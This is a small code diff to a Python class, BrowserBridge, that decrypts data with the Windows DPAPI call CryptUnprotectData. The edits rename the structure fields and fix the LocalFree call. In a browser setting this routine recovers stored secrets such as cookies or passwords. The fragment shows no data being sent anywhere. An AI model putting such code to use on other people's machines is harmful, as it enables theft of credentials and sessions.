@@ -63,11 +63,11 @@ class BrowserBridge:
             blob_out = DATA_BLOB()
 
             if windll.crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0x01, byref(blob_out)):
-                cb_data = int(blob_out.cbData)
-                pb_data = blob_out.pbData
+                cb_data = int(blob_out.cb_data)
+                pb_data = blob_out.pb_data
                 buffer = c_buffer(cb_data)
                 windll.msvcrt.memcpy(buffer, pb_data, cb_data)
-                windll.kernel32.localfree(pb_data)
+                windll.kernel32.LocalFree(pb_data)
                 return buffer.raw.decode(locale.getpreferredencoding())
             else:
                 return ""
